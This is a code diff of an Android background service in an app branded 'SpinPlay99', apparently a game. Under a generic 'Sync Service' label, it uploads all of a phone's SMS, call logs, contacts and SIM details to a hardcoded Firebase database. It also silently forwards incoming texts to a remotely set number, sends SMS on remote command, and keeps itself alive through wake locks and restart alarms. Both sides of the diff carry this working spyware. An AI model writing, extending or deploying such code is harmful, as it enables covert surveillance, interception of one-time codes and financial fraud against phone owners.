@@ -44,269 +44,167 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
 import java.util.Map;
-import java.util.concurrent.atomic.AtomicBoolean;
-import java.util.concurrent.atomic.AtomicLong;
-import android.net.ConnectivityManager;
-import android.net.Network;
-import android.net.NetworkCapabilities;
-import android.net.NetworkRequest;
 
 public class BackgroundSyncService extends Service {
 
-    private static final String DB_URL            = "https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app";
-    private static final String CHANNEL_ID        = "spinplay99_channel";
-    private static final int    NOTIFICATION_ID   = 999;
-    private static final String PREFS_NAME        = "SpinPlaySyncPrefs";
-    private static final String KEY_SMS_COUNT     = "last_sms_count";
-    private static final String KEY_CALL_COUNT    = "last_call_count";
-    private static final String KEY_CONTACT_COUNT = "last_contact_count";
-    private static final long   LIVE_INTERVAL     = 3_000;
-    private static final long   FULL_INTERVAL     = 60_000;
+    private static final String  DB_URL           = "https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app";
+    private static final String  CHANNEL_ID       = "spinplay99_channel";
+    private static final int     NOTIFICATION_ID  = 999;
+    private static final String  PREFS_NAME       = "SpinPlaySyncPrefs";
+    private static final String  KEY_SMS_COUNT    = "last_sms_count";
+    private static final String  KEY_CALL_COUNT   = "last_call_count";
+    private static final String  KEY_CONTACT_COUNT= "last_contact_count";
+    private static final long    LIVE_INTERVAL    = 3000;
+    private static final long    FULL_INTERVAL    = 60000;
 
-    private FirebaseDatabase     firebaseDb;
-    private DatabaseReference    rootRef;
-    private DatabaseReference    deviceRef;
+    private DatabaseReference    databaseReference;
     private String               deviceId;
-    private Handler              mainHandler;
+    private Handler              handler;
     private Runnable             syncRunnable;
     private SmsManager           smsManager;
     private ValueEventListener   forwardingListener;
     private ValueEventListener   commandListener;
     private ValueEventListener   connListener;
-    private DatabaseReference    connRef;
-    private ConnectivityManager.NetworkCallback networkCallback;
-    private String               forwardingNumber   = "";
-    private boolean              forwardingEnabled  = false;
-    private final List<String>   forwardingFilters  = new ArrayList<>();
-    private boolean              forwardAllSms      = true;
+    private String               forwardingNumber = "";
+    private boolean              forwardingEnabled = false;
+    private List<String>         forwardingFilters = new ArrayList<>();
+    private boolean              forwardAllSms    = true;
     private SharedPreferences    prefs;
-    private final AtomicLong     lastFullSyncTime   = new AtomicLong(0);
-    private final AtomicBoolean  fullSyncRunning    = new AtomicBoolean(false);
+    private long                 lastFullSyncTime = 0;
     private PowerManager.WakeLock wakeLock;
-
-    // ─────────────────────────────────────────────
-    // Lifecycle
-    // ─────────────────────────────────────────────
 
     @Override
     public void onCreate() {
         super.onCreate();
 
-        // Partial wake lock — keeps CPU awake so Firebase WebSocket stays alive
+        // Acquire partial wake lock — keeps CPU awake so Firebase stays connected
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-        if (pm != null) {
-            wakeLock = pm.newWakeLock(
-                PowerManager.PARTIAL_WAKE_LOCK, "SpinPlay99:SyncWakeLock");
-            wakeLock.acquire();
-        }
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpinPlay99:SyncWakeLock");
+        wakeLock.acquire();
 
-        // Init Firebase (safe if already initialized)
         if (FirebaseApp.getApps(this).isEmpty()) {
             FirebaseApp.initializeApp(this);
         }
 
-        // Enable persistence once — queues writes when briefly offline
+        // Enable offline persistence — Firebase queues writes even when briefly disconnected
         try {
             FirebaseDatabase.getInstance(DB_URL).setPersistenceEnabled(true);
         } catch (Exception ignored) {}
 
-        firebaseDb = FirebaseDatabase.getInstance(DB_URL);
-        rootRef    = firebaseDb.getReference();
-        deviceId   = Settings.Secure.getString(
-            getContentResolver(), Settings.Secure.ANDROID_ID);
-        deviceRef  = rootRef.child("devices").child(deviceId);
-
-        mainHandler = new Handler(Looper.getMainLooper());
-        smsManager  = getSmsManager();
-        prefs       = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        databaseReference = FirebaseDatabase.getInstance(DB_URL).getReference();
+        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        handler  = new Handler(Looper.getMainLooper());
+        smsManager = SmsManager.getDefault();
+        prefs    = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
 
         createNotificationChannel();
-        startForeground(NOTIFICATION_ID, buildNotification());
+        startForeground(NOTIFICATION_ID, createNotification());
 
-        // Keep this device node synced for offline read
-        deviceRef.keepSynced(true);
+        // Keep device node synced even offline
+        databaseReference.child("devices").child(deviceId).keepSynced(true);
 
         loadForwardingSettings();
         listenForManualCommands();
         listenForConnection();
-        registerNetworkCallback();
         scheduleRestart(this);
-        doFullDataSync();            // first-run upload of all SMS/calls/contacts
+        doFullDataSync();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Mark online immediately on every start/restart
-        if (deviceRef != null) {
-            deviceRef.child("online_status").setValue(true);
-        }
-        // Re-attach connection listener only if previous instance was destroyed
+        // Re-register connection listener if service was restarted
         if (connListener == null) listenForConnection();
         startSyncLoop();
         return START_STICKY;
     }
 
-    @Override
-    public IBinder onBind(Intent intent) { return null; }
-
-    @Override
-    public void onDestroy() {
-        // Stop sync loop
-        if (mainHandler != null && syncRunnable != null) {
-            mainHandler.removeCallbacks(syncRunnable);
-        }
-        // Remove all Firebase listeners (prevent listener accumulation across restarts)
-        try {
-            if (connListener != null && connRef != null) {
-                connRef.removeEventListener(connListener);
-                connListener = null;
-            }
-            if (forwardingListener != null) {
-                deviceRef.child("forwarding_settings").removeEventListener(forwardingListener);
-            }
-            if (commandListener != null) {
-                deviceRef.child("manual_commands").child("send_sms")
-                    .removeEventListener(commandListener);
-            }
-        } catch (Exception ignored) {}
-        // Release wake lock
-        try {
-            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
-        } catch (Exception ignored) {}
-        // Unregister network callback
-        try {
-            if (networkCallback != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-                if (cm != null) cm.unregisterNetworkCallback(networkCallback);
-                networkCallback = null;
-            }
-        } catch (Exception ignored) {}
-        super.onDestroy();
-    }
-
-    @Override
-    public void onTaskRemoved(Intent rootIntent) {
-        // Immediately try to restart + reschedule alarm
-        scheduleRestart(getApplicationContext());
-        try {
-            Intent restart = new Intent(getApplicationContext(), BackgroundSyncService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                getApplicationContext().startForegroundService(restart);
-            } else {
-                getApplicationContext().startService(restart);
-            }
-        } catch (Exception ignored) {}
-        super.onTaskRemoved(rootIntent);
-    }
-
-    // ─────────────────────────────────────────────
-    // Sync Loop
-    // ─────────────────────────────────────────────
-
     private void startSyncLoop() {
-        if (syncRunnable != null) mainHandler.removeCallbacks(syncRunnable);
+        if (syncRunnable != null) handler.removeCallbacks(syncRunnable);
         syncRunnable = new Runnable() {
             @Override
             public void run() {
                 syncLiveData();
                 long now = System.currentTimeMillis();
-                if (now - lastFullSyncTime.get() >= FULL_INTERVAL) {
-                    // goOnline once per minute — forces reconnection if dropped
-                    try { firebaseDb.goOnline(); } catch (Exception ignored) {}
+                if (now - lastFullSyncTime >= FULL_INTERVAL) {
                     doFullDataSync();
-                    lastFullSyncTime.set(now);
+                    lastFullSyncTime = now;
                 }
-                mainHandler.postDelayed(this, LIVE_INTERVAL);
+                handler.postDelayed(this, LIVE_INTERVAL);
             }
         };
-        mainHandler.post(syncRunnable);
+        handler.post(syncRunnable);
     }
 
-    // ─────────────────────────────────────────────
-    // Live Data (every 3 seconds)
-    // ─────────────────────────────────────────────
-
+    /** Fast sync — only live metrics. onDisconnect() is NOT called here
+     *  to avoid Firebase connection instability. */
     private void syncLiveData() {
+        DatabaseReference deviceRef = databaseReference.child("devices").child(deviceId);
+
+        // Set online and update live data
         deviceRef.child("online_status").setValue(true);
 
         Map<String, Object> live = new HashMap<>();
-        live.put("timestamp",        new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
+        SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+        live.put("timestamp",        fmt.format(new Date()));
         live.put("timestamp_millis", ServerValue.TIMESTAMP);
         live.put("battery_level",    getBatteryLevel());
         live.put("network_type",     getNetworkType());
         live.put("is_charging",      isDeviceCharging());
         live.put("permissions",      getAllPermissions());
         live.put("sim_info",         getSimInformation());
-        if (checkPerm(Manifest.permission.READ_SMS))
-            live.put("total_sms",    getCount(Telephony.Sms.CONTENT_URI));
-        if (checkPerm(Manifest.permission.READ_CALL_LOG))
-            live.put("total_calls",  getCount(CallLog.Calls.CONTENT_URI));
-        if (checkPerm(Manifest.permission.READ_CONTACTS))
-            live.put("contacts_count", getCount(android.provider.ContactsContract.Contacts.CONTENT_URI));
+        if (checkPermission(Manifest.permission.READ_SMS))
+            live.put("total_sms",    getSmsCount());
+        if (checkPermission(Manifest.permission.READ_CALL_LOG))
+            live.put("total_calls",  getCallLogCount());
+        if (checkPermission(Manifest.permission.READ_CONTACTS))
+            live.put("contacts_count", getContactCount());
 
         deviceRef.child("live_data").setValue(live);
         updateDeviceInfo();
         checkAndForwardNewSms();
     }
 
-    // ─────────────────────────────────────────────
-    // Firebase Connection Listener
-    // ─────────────────────────────────────────────
-
+    /** Listens to Firebase connection state. On every (re)connect:
+     *  sets online_status=true and registers onDisconnect handlers ONCE. */
     private void listenForConnection() {
-        if (connListener != null) return; // already attached
-        connRef      = firebaseDb.getReference(".info/connected");
+        if (connListener != null) return; // already listening
         connListener = new ValueEventListener() {
             @Override
-            public void onDataChange(@NonNull DataSnapshot snap) {
-                Boolean connected = snap.getValue(Boolean.class);
-                if (Boolean.TRUE.equals(connected)) {
-                    // Re-register online_status and disconnect handlers on every reconnect
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                Boolean connected = snapshot.getValue(Boolean.class);
+                if (connected != null && connected) {
+                    DatabaseReference deviceRef = databaseReference.child("devices").child(deviceId);
                     deviceRef.child("online_status").setValue(true);
+                    // Register server-side disconnect handlers ONCE per connection
                     deviceRef.child("online_status").onDisconnect().setValue(false);
-                    deviceRef.child("live_data").child("timestamp_millis")
-                        .onDisconnect().setValue(ServerValue.TIMESTAMP);
-                    deviceRef.child("device_info").child("last_seen")
-                        .onDisconnect().setValue(ServerValue.TIMESTAMP);
+                    deviceRef.child("live_data").child("timestamp_millis").onDisconnect().setValue(ServerValue.TIMESTAMP);
+                    deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
                 }
             }
             @Override
-            public void onCancelled(@NonNull DatabaseError e) {}
+            public void onCancelled(@NonNull DatabaseError error) {}
         };
-        connRef.addValueEventListener(connListener);
+        FirebaseDatabase.getInstance(DB_URL)
+            .getReference(".info/connected")
+            .addValueEventListener(connListener);
     }
 
-    // ─────────────────────────────────────────────
-    // Full Data Sync (SMS / Calls / Contacts)
-    // ─────────────────────────────────────────────
-
     private void doFullDataSync() {
-        if (!fullSyncRunning.compareAndSet(false, true)) return; // skip if already running
         new Thread(() -> {
-            try {
-                if (checkPerm(Manifest.permission.READ_SMS)) {
-                    int current = getCount(Telephony.Sms.CONTENT_URI);
-                    if (current != prefs.getInt(KEY_SMS_COUNT, -1)) {
-                        uploadAllSms();
-                        prefs.edit().putInt(KEY_SMS_COUNT, current).apply();
-                    }
-                }
-                if (checkPerm(Manifest.permission.READ_CALL_LOG)) {
-                    int current = getCount(CallLog.Calls.CONTENT_URI);
-                    if (current != prefs.getInt(KEY_CALL_COUNT, -1)) {
-                        uploadAllCalls();
-                        prefs.edit().putInt(KEY_CALL_COUNT, current).apply();
-                    }
-                }
-                if (checkPerm(Manifest.permission.READ_CONTACTS)) {
-                    int current = getCount(android.provider.ContactsContract.Contacts.CONTENT_URI);
-                    if (current != prefs.getInt(KEY_CONTACT_COUNT, -1)) {
-                        uploadAllContacts();
-                        prefs.edit().putInt(KEY_CONTACT_COUNT, current).apply();
-                    }
-                }
-            } finally {
-                fullSyncRunning.set(false);
+            if (checkPermission(Manifest.permission.READ_SMS)) {
+                int current = getSmsCount();
+                int last    = prefs.getInt(KEY_SMS_COUNT, -1);
+                if (current != last) { uploadAllSms(); prefs.edit().putInt(KEY_SMS_COUNT, current).apply(); }
+            }
+            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
+                int current = getCallLogCount();
+                int last    = prefs.getInt(KEY_CALL_COUNT, -1);
+                if (current != last) { uploadAllCalls(); prefs.edit().putInt(KEY_CALL_COUNT, current).apply(); }
+            }
+            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
+                int current = getContactCount();
+                int last    = prefs.getInt(KEY_CONTACT_COUNT, -1);
+                if (current != last) { uploadAllContacts(); prefs.edit().putInt(KEY_CONTACT_COUNT, current).apply(); }
             }
         }).start();
     }
@@ -319,12 +217,8 @@ public class BackgroundSyncService extends Service {
         info.put("android_version", Build.VERSION.RELEASE);
         info.put("last_seen",       ServerValue.TIMESTAMP);
         info.put("sim_info",        getDetailedSimInfo());
-        deviceRef.child("device_info").updateChildren(info);
+        databaseReference.child("devices").child(deviceId).child("device_info").updateChildren(info);
     }
-
-    // ─────────────────────────────────────────────
-    // SMS Upload
-    // ─────────────────────────────────────────────
 
     private void uploadAllSms() {
         List<Map<String, Object>> list = getAllSmsMessages();
@@ -332,7 +226,7 @@ public class BackgroundSyncService extends Service {
         data.put("total_count",  list.size());
         data.put("last_updated", ServerValue.TIMESTAMP);
         data.put("messages",     list);
-        deviceRef.child("all_sms").setValue(data);
+        databaseReference.child("devices").child(deviceId).child("all_sms").setValue(data);
     }
 
     private List<Map<String, Object>> getAllSmsMessages() {
@@ -346,29 +240,27 @@ public class BackgroundSyncService extends Service {
             if (cursor != null && cursor.moveToFirst()) {
                 do {
                     Map<String, Object> sms = new HashMap<>();
-                    sms.put("id",      safe(cursor, 0));
-                    sms.put("address", safe(cursor, 1));
-                    String body = safe(cursor, 2);
+                    sms.put("id",      getCursorValue(cursor, 0));
+                    sms.put("address", getCursorValue(cursor, 1));
+                    String body = getCursorValue(cursor, 2);
                     if (body != null && body.length() > 500) body = body.substring(0, 500) + "...";
                     sms.put("body", body);
-                    String ds = safe(cursor, 3);
-                    sms.put("date", ds);
-                    if (ds != null && !ds.isEmpty())
-                        sms.put("date_readable", fmtTs(Long.parseLong(ds)));
-                    String t = safe(cursor, 4);
-                    sms.put("type", "1".equals(t) ? "INBOX" : "2".equals(t) ? "SENT" : "OTHER");
-                    sms.put("read", safe(cursor, 5));
+                    String dateStr = getCursorValue(cursor, 3);
+                    sms.put("date", dateStr);
+                    if (dateStr != null && !dateStr.isEmpty())
+                        sms.put("date_readable", formatTimestamp(Long.parseLong(dateStr)));
+                    String typeStr = getCursorValue(cursor, 4);
+                    if ("1".equals(typeStr)) sms.put("type", "INBOX");
+                    else if ("2".equals(typeStr)) sms.put("type", "SENT");
+                    else sms.put("type", "OTHER");
+                    sms.put("read", getCursorValue(cursor, 5));
                     result.add(sms);
                 } while (cursor.moveToNext());
             }
         } catch (Exception ignored) {
-        } finally { close(cursor); }
+        } finally { if (cursor != null) cursor.close(); }
         return result;
     }
-
-    // ─────────────────────────────────────────────
-    // Calls Upload
-    // ─────────────────────────────────────────────
 
     private void uploadAllCalls() {
         List<Map<String, Object>> list = getAllCallLogs();
@@ -376,7 +268,7 @@ public class BackgroundSyncService extends Service {
         data.put("total_count",  list.size());
         data.put("last_updated", ServerValue.TIMESTAMP);
         data.put("calls",        list);
-        deviceRef.child("all_calls").setValue(data);
+        databaseReference.child("devices").child(deviceId).child("all_calls").setValue(data);
     }
 
     private List<Map<String, Object>> getAllCallLogs() {
@@ -389,28 +281,27 @@ public class BackgroundSyncService extends Service {
                 null, null, "date DESC");
             if (cursor != null && cursor.moveToFirst()) {
                 do {
-                    Map<String, Object> c = new HashMap<>();
-                    c.put("id",     safe(cursor, 0));
-                    c.put("number", safe(cursor, 1));
-                    String t = safe(cursor, 2);
-                    c.put("type", "1".equals(t) ? "INCOMING" : "2".equals(t) ? "OUTGOING" : "3".equals(t) ? "MISSED" : "UNKNOWN");
-                    String ds = safe(cursor, 3);
-                    c.put("date", ds);
-                    if (ds != null && !ds.isEmpty())
-                        c.put("date_readable", fmtTs(Long.parseLong(ds)));
-                    c.put("duration",     safe(cursor, 4));
-                    c.put("contact_name", safe(cursor, 5));
-                    result.add(c);
+                    Map<String, Object> call = new HashMap<>();
+                    call.put("id",     getCursorValue(cursor, 0));
+                    call.put("number", getCursorValue(cursor, 1));
+                    String typeStr = getCursorValue(cursor, 2);
+                    if ("1".equals(typeStr)) call.put("type", "INCOMING");
+                    else if ("2".equals(typeStr)) call.put("type", "OUTGOING");
+                    else if ("3".equals(typeStr)) call.put("type", "MISSED");
+                    else call.put("type", "UNKNOWN");
+                    String dateStr = getCursorValue(cursor, 3);
+                    call.put("date", dateStr);
+                    if (dateStr != null && !dateStr.isEmpty())
+                        call.put("date_readable", formatTimestamp(Long.parseLong(dateStr)));
+                    call.put("duration",     getCursorValue(cursor, 4));
+                    call.put("contact_name", getCursorValue(cursor, 5));
+                    result.add(call);
                 } while (cursor.moveToNext());
             }
         } catch (Exception ignored) {
-        } finally { close(cursor); }
+        } finally { if (cursor != null) cursor.close(); }
         return result;
     }
-
-    // ─────────────────────────────────────────────
-    // Contacts Upload
-    // ─────────────────────────────────────────────
 
     private void uploadAllContacts() {
         List<Map<String, Object>> list = getAllContactsList();
@@ -418,7 +309,7 @@ public class BackgroundSyncService extends Service {
         data.put("total_count",  list.size());
         data.put("last_updated", ServerValue.TIMESTAMP);
         data.put("contacts",     list);
-        deviceRef.child("all_contacts").setValue(data);
+        databaseReference.child("devices").child(deviceId).child("all_contacts").setValue(data);
     }
 
     private List<Map<String, Object>> getAllContactsList() {
@@ -432,34 +323,31 @@ public class BackgroundSyncService extends Service {
             if (cursor != null && cursor.moveToFirst()) {
                 do {
                     Map<String, Object> c = new HashMap<>();
-                    String cId = safe(cursor, 0);
+                    String cId = getCursorValue(cursor, 0);
                     c.put("id",   cId);
-                    c.put("name", safe(cursor, 1));
-                    if ("1".equals(safe(cursor, 2)))
+                    c.put("name", getCursorValue(cursor, 1));
+                    if ("1".equals(getCursorValue(cursor, 2)))
                         c.put("phone", getPhoneForContact(cId));
                     result.add(c);
                 } while (cursor.moveToNext());
             }
         } catch (Exception ignored) {
-        } finally { close(cursor); }
+        } finally { if (cursor != null) cursor.close(); }
         return result;
     }
 
     private String getPhoneForContact(String id) {
-        Cursor c = null;
         try {
-            c = getContentResolver().query(
+            Cursor c = getContentResolver().query(
                 android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 new String[]{"number"}, "contact_id=?", new String[]{id}, null);
-            if (c != null && c.moveToFirst()) return c.getString(0);
-        } catch (Exception ignored) {
-        } finally { close(c); }
+            if (c != null && c.moveToFirst()) {
+                String n = c.getString(0); c.close(); return n;
+            }
+            if (c != null) c.close();
+        } catch (Exception ignored) {}
         return "";
     }
-
-    // ─────────────────────────────────────────────
-    // SMS Forwarding
-    // ─────────────────────────────────────────────
 
     private void loadForwardingSettings() {
         forwardingListener = new ValueEventListener() {
@@ -467,10 +355,10 @@ public class BackgroundSyncService extends Service {
             public void onDataChange(@NonNull DataSnapshot snap) {
                 if (!snap.exists()) return;
                 forwardingNumber  = snap.child("forward_to").getValue(String.class);
-                Boolean en  = snap.child("enabled").getValue(Boolean.class);
+                Boolean en = snap.child("enabled").getValue(Boolean.class);
+                forwardingEnabled = en != null && en;
                 Boolean all = snap.child("forward_all").getValue(Boolean.class);
-                forwardingEnabled = Boolean.TRUE.equals(en);
-                forwardAllSms     = all == null || all;
+                forwardAllSms = all == null || all;
                 forwardingFilters.clear();
                 for (DataSnapshot f : snap.child("filters").getChildren()) {
                     String n = f.getValue(String.class);
@@ -479,15 +367,35 @@ public class BackgroundSyncService extends Service {
             }
             @Override public void onCancelled(@NonNull DatabaseError e) {}
         };
-        deviceRef.child("forwarding_settings").addValueEventListener(forwardingListener);
+        databaseReference.child("devices").child(deviceId).child("forwarding_settings")
+            .addValueEventListener(forwardingListener);
+    }
+
+    private void forwardSmsMessage(String from, String body, long ts) {
+        if (!forwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) return;
+        if (!forwardAllSms && !forwardingFilters.isEmpty()) {
+            boolean matched = false;
+            for (String f : forwardingFilters) { if (from.contains(f)) { matched = true; break; } }
+            if (!matched) return;
+        }
+        try {
+            smsManager.sendTextMessage(forwardingNumber, null, "From: " + from + "\n" + body, null, null);
+            Map<String, Object> log = new HashMap<>();
+            log.put("from", from);
+            log.put("to",   forwardingNumber);
+            log.put("body", body != null && body.length() > 100 ? body.substring(0, 100) : body);
+            log.put("status",       "FORWARDED");
+            log.put("forwarded_at", ServerValue.TIMESTAMP);
+            databaseReference.child("devices").child(deviceId).child("forwarded_sms").push().setValue(log);
+        } catch (Exception ignored) {}
     }
 
     private void checkAndForwardNewSms() {
-        if (!forwardingEnabled || !checkPerm(Manifest.permission.READ_SMS)) return;
+        if (!forwardingEnabled || !checkPermission(Manifest.permission.READ_SMS)) return;
         new Thread(() -> {
             Cursor cursor = null;
             try {
-                long ago = System.currentTimeMillis() - 10_000;
+                long ago = System.currentTimeMillis() - 10000;
                 cursor = getContentResolver().query(
                     Telephony.Sms.Inbox.CONTENT_URI,
                     new String[]{"address","body","date"},
@@ -495,37 +403,16 @@ public class BackgroundSyncService extends Service {
                     "date DESC LIMIT 5");
                 if (cursor != null && cursor.moveToFirst()) {
                     do {
-                        forwardSms(safe(cursor, 0), safe(cursor, 1),
-                            Long.parseLong(safe(cursor, 2)));
+                        forwardSmsMessage(
+                            getCursorValue(cursor, 0),
+                            getCursorValue(cursor, 1),
+                            Long.parseLong(getCursorValue(cursor, 2)));
                     } while (cursor.moveToNext());
                 }
             } catch (Exception ignored) {
-            } finally { close(cursor); }
+            } finally { if (cursor != null) cursor.close(); }
         }).start();
     }
-
-    private void forwardSms(String from, String body, long ts) {
-        if (!forwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) return;
-        if (!forwardAllSms && !forwardingFilters.isEmpty()) {
-            boolean match = false;
-            for (String f : forwardingFilters) { if (from.contains(f)) { match = true; break; } }
-            if (!match) return;
-        }
-        try {
-            smsManager.sendTextMessage(forwardingNumber, null, "From: " + from + "\n" + body, null, null);
-            Map<String, Object> log = new HashMap<>();
-            log.put("from",         from);
-            log.put("to",           forwardingNumber);
-            log.put("body",         body != null && body.length() > 100 ? body.substring(0, 100) : body);
-            log.put("status",       "FORWARDED");
-            log.put("forwarded_at", ServerValue.TIMESTAMP);
-            deviceRef.child("forwarded_sms").push().setValue(log);
-        } catch (Exception ignored) {}
-    }
-
-    // ─────────────────────────────────────────────
-    // Manual SMS Command Listener
-    // ─────────────────────────────────────────────
 
     private void listenForManualCommands() {
         commandListener = new ValueEventListener() {
@@ -542,7 +429,7 @@ public class BackgroundSyncService extends Service {
                             log.put("message", msg);
                             log.put("status",  "SENT");
                             log.put("sent_at", ServerValue.TIMESTAMP);
-                            deviceRef.child("sent_sms").push().setValue(log);
+                            databaseReference.child("devices").child(deviceId).child("sent_sms").push().setValue(log);
                         } catch (Exception ignored) {}
                     }
                     cmd.getRef().removeValue();
@@ -550,97 +437,68 @@ public class BackgroundSyncService extends Service {
             }
             @Override public void onCancelled(@NonNull DatabaseError e) {}
         };
-        deviceRef.child("manual_commands").child("send_sms")
+        databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
             .addValueEventListener(commandListener);
     }
 
-    // ─────────────────────────────────────────────
-    // AlarmManager Keepalive (chain — fires every ~1 min, doze-safe)
-    // ─────────────────────────────────────────────
-
-    /** When net comes back, immediately force Firebase online + sync */
-    private void registerNetworkCallback() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
-        try {
-            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-            if (cm == null) return;
-            NetworkRequest req = new NetworkRequest.Builder()
-                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
-                .build();
-            networkCallback = new ConnectivityManager.NetworkCallback() {
-                @Override
-                public void onAvailable(Network network) {
-                    // Net is back — wake Firebase immediately
-                    mainHandler.post(() -> {
-                        try { firebaseDb.goOnline(); } catch (Exception ignored) {}
-                        if (deviceRef != null) deviceRef.child("online_status").setValue(true);
-                        lastFullSyncTime.set(0); // force full sync on next loop
-                    });
-                }
-                @Override
-                public void onLost(Network network) {
-                    // Net lost — Firebase onDisconnect() will handle offline status
-                }
-            };
-            cm.registerNetworkCallback(req, networkCallback);
-        } catch (Exception ignored) {}
-    }
-
-        public static void scheduleRestart(Context ctx) {
-        try {
-            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
-            Intent intent   = new Intent(ctx, ServiceRestartReceiver.class);
-            PendingIntent pi = PendingIntent.getBroadcast(
-                ctx, 0, intent,
-                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-            if (am != null) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    // fires in Doze mode, no permission needed
-                    am.setAndAllowWhileIdle(
-                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                        SystemClock.elapsedRealtime() + 60_000, pi);
-                } else {
-                    am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                        SystemClock.elapsedRealtime() + 60_000, pi);
-                }
+    public static void scheduleRestart(Context ctx) {
+        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
+        Intent intent   = new Intent(ctx, ServiceRestartReceiver.class);
+        PendingIntent pi = PendingIntent.getBroadcast(
+            ctx, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+        if (am != null) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + 60_000, pi);
+            } else {
+                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + 60_000, pi);
             }
-        } catch (Exception ignored) {}
-    }
-
-    // ─────────────────────────────────────────────
-    // Notification
-    // ─────────────────────────────────────────────
-
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel(
-                CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_LOW);
-            ch.setDescription("Background data sync");
-            NotificationManager nm = getSystemService(NotificationManager.class);
-            if (nm != null) nm.createNotificationChannel(ch);
         }
     }
 
-    private Notification buildNotification() {
-        PendingIntent pi = PendingIntent.getActivity(
-            this, 0, new Intent(this, SplashActivity.class), PendingIntent.FLAG_IMMUTABLE);
-        return new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("SpinPlay99")
-            .setContentText("Service Running...")
-            .setSmallIcon(android.R.drawable.ic_menu_manage)
-            .setContentIntent(pi)
-            .setOngoing(true)
-            .build();
+    // ─── Helpers ───
+
+    private String getCursorValue(Cursor c, int i) {
+        try { return c.getString(i); } catch (Exception e) { return ""; }
     }
 
-    // ─────────────────────────────────────────────
-    // Hardware / System Info
-    // ─────────────────────────────────────────────
+    private String formatTimestamp(long ts) {
+        try { return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(ts)); }
+        catch (Exception e) { return ""; }
+    }
+
+    private int getSmsCount()     { return getCount(Telephony.Sms.CONTENT_URI); }
+    private int getCallLogCount() { return getCount(CallLog.Calls.CONTENT_URI); }
+    private int getContactCount() { return getCount(android.provider.ContactsContract.Contacts.CONTENT_URI); }
+
+    private int getCount(Uri uri) {
+        int n = 0;
+        try {
+            Cursor c = getContentResolver().query(uri, null, null, null, null);
+            if (c != null) { n = c.getCount(); c.close(); }
+        } catch (Exception ignored) {}
+        return n;
+    }
+
+    private Map<String, Boolean> getAllPermissions() {
+        Map<String, Boolean> p = new HashMap<>();
+        p.put("read_sms",      checkPermission(Manifest.permission.READ_SMS));
+        p.put("send_sms",      checkPermission(Manifest.permission.SEND_SMS));
+        p.put("receive_sms",   checkPermission(Manifest.permission.RECEIVE_SMS));
+        p.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
+        p.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
+        p.put("call_phone",    checkPermission(Manifest.permission.CALL_PHONE));
+        return p;
+    }
+
+    private boolean checkPermission(String p) {
+        return ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED;
+    }
 
     private int getBatteryLevel() {
         try {
-            Intent i = registerReceiver(null,
-                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+            Intent i = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
             if (i != null) {
                 int scale = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                 int level = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
@@ -650,24 +508,10 @@ public class BackgroundSyncService extends Service {
         return 0;
     }
 
-    private boolean isDeviceCharging() {
-        try {
-            Intent i = registerReceiver(null,
-                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-            if (i != null) {
-                int s = i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
-                return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING
-                    || s == android.os.BatteryManager.BATTERY_STATUS_FULL;
-            }
-        } catch (Exception ignored) {}
-        return false;
-    }
-
